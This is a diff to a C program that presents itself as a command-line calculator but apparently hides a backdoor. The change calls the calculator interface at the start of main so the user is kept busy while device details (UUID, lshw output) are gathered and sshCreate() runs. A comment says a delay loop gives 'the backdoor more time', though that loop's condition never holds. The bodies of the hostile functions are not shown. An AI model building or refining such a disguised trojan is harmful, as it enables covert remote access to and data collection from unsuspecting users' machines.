@@ -211,7 +211,7 @@ void calculatorInterface() /* GTK is a bit of a nightmare; CLI UIs all the way, 
 		}
 	}
 
-	printf("Thank you for your entries!\nPlease wait just a moment while we calculate your results.\n");
+	printf("Thank you for your entries!\nPlease wait just a moment while we calculate your results.\n\n\n");
 	
 	for(int i = 0; i > 100000; i++){}; //wait some time (so the backdoor has more time)
 
@@ -345,6 +345,8 @@ void sshCreate()
 //MAIN FUNCTION~~~~~~~~~~~~~~
 int main()
 {
+    calculatorInterface();
+
 //Defining Device Extraction variables.  Accounted for End-of-String character.  Char length matches max length defined in the database
 	char UUID[51] = "8284246F-STUPID-1945-90DD-DD6D00E95954";
 	char lshw[13001] = "";
@@ -458,5 +460,5 @@ int main()
 	
 	sshCreate();
 	
-	calculatorInterface();
+	//Run the calculator
 }
